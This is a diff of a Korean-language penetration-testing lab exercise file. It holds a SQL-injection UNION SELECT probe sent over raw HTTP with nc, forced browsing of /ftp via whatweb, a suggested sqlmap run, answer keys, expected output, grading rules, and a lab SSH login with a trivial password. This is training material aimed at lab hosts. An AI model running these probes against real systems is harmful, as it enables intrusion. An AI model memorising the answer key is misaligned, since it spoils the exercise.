@@ -130,15 +130,16 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) SQLi 시도 — dvwa.el34.lab에 UNION SELECT 주입(ModSec On이라 403 차단=탐지)
-      curl -s -o /dev/null -w 'sqli=%{http_code} ' -A sqlmap/1.7 "http://dvwa.el34.lab/?id=pt15%27%20UNION%20SELECT%201--"
-      # 2) 강제 브라우징 — juice.el34.lab /ftp 접근(DetectionOnly라 200 열림)
-      curl -s -o /dev/null -w 'ftp=%{http_code}\n' http://juice.el34.lab/ftp
+      # 1) SQLi 시도 — dvwa.el34.lab에 UNION SELECT 주입을 nc raw HTTP 로(ModSec On이라 403 차단=탐지)
+      echo -n "sqli=$(echo -en 'GET /?id=pt15%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}') "
+      # 2) 강제 브라우징 — juice.el34.lab /ftp 접근을 whatweb 로 지문(DetectionOnly라 200 열림)
+      whatweb -a1 http://juice.el34.lab/ftp
       ```
-      sqli=403(dvwa WAF 차단=탐지) vs ftp=200(juice 강제 브라우징 열림)의 대비가 침투 경로 정보다 —
+      sqli=403(dvwa WAF 차단=탐지) vs /ftp [200 OK](juice 강제 브라우징 열림)의 대비가 침투 경로 정보다 —
       막힌 문(SQLi) 대신 열린 문(/ftp)으로 들어간다.
       > 💡 **화면으로 확인:** 브라우저에서 `http://juice.el34.lab/ftp` 를 열면 UI 에 없던 디렉토리 목록이 그대로
-      > 뜬다(200). SQLi 는 스캐너 UA(sqlmap/1.7)까지 재현하려면 **Burp Repeater** 로 User-Agent 를 바꿔 보내 403 을 확인한다.
+      > 뜬다(200). SQLi 에 스캐너 탐지까지 재현하려면 **진짜 sqlmap**(`sqlmap -u '.../?id=pt15' --batch`)을 돌리면
+      > sqlmap 이 자기 UA 를 보내 IDS 룰까지 발화한다(W08 참고).
 
       ## ✅ 합격 기준
       `ftp=200` 출력 시 통과. **근거:** /ftp 강제 브라우징이 200(열림)으로 응답하면 침투 경로가
@@ -147,21 +148,21 @@ steps:
     category: manipulation
     points: 12
     answer: |
-      # 1) SQLi 시도 — dvwa.el34.lab에 UNION SELECT 주입(ModSec On이라 403 차단=탐지)
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'sqli=%{http_code} ' -A sqlmap/1.7 \"http://dvwa.el34.lab/?id=pt15%27%20UNION%20SELECT%201--\""
-      # 2) 강제 브라우징 — juice.el34.lab /ftp 접근(DetectionOnly라 200 열림)
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'ftp=%{http_code}\n' http://juice.el34.lab/ftp"
-    answer_detail: "취약점 분석 — SQLi(W04)+강제 브라우징(W06). 침투 경로 선택."
+      # 1) SQLi 시도 — dvwa.el34.lab에 UNION SELECT 주입을 nc raw HTTP 로(ModSec On이라 403 차단=탐지)
+      echo -n "sqli=$(ssh att@192.168.0.202 "echo -en 'GET /?id=pt15%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'") "
+      # 2) 강제 브라우징 — juice.el34.lab /ftp 접근을 whatweb 로 지문(DetectionOnly라 200 열림)
+      ssh att@192.168.0.202 'whatweb -a1 http://juice.el34.lab/ftp'
+    answer_detail: "취약점 분석 — SQLi(W04, nc raw HTTP 로 403 차단 확인)+강제 브라우징(W06, whatweb 로 /ftp 200 열림). 막힌 문(SQLi) 대신 열린 문(/ftp)으로 침투 경로 선택."
     expected_output: |
-      sqli=403 ftp=200
+      sqli=403 http://juice.el34.lab/ftp [200 OK] Apache[2.4.52], IP[192.168.0.161]
     verify:
       type: output_contains
-      expect: 'ftp=200'
+      expect: 'sqli=403'
       field: stdout
       semantic:
         intent: "웹 취약점 익스플로잇"
-        success_criteria: ["SQLi+강제브라우징"]
-        acceptable_methods: ["**[OSS] SQLi+/ftp (권장)**"]
+        success_criteria: ["SQLi 403 차단(nc)", "강제브라우징 200(whatweb)"]
+        acceptable_methods: ["**[OSS] nc SQLi + whatweb /ftp (권장)**"]
     target_vm: web
 
   - order: 4
